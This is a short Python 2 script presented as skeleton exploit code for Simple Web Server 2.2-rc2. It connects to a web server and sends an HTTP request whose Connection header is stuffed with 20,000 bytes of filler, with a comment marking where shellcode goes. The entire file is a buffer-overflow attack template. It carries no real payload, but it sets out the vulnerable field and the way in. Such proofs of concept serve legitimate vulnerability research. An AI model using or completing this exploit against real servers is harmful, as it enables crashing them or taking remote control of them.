#!/usr/bin/env python
# Skeleton exploit code for Simple Web Server 2.2-rc2
# Author: Prashant Kumar (@notsoshant)

import os
import sys
import socket

ip = "127.0.0.1"

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

socket.connect((ip , 80))

shellcode = "A"*20000 # All shellcode goes here

buffer = "GET / HTTP/1.1\r\n"
buffer += "Host: " + ip + "\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer += "Connection: " + shellcode + "\r\n\r\n"

socket.send(buffer)

data = socket.recv(4096)
print data
socket.close()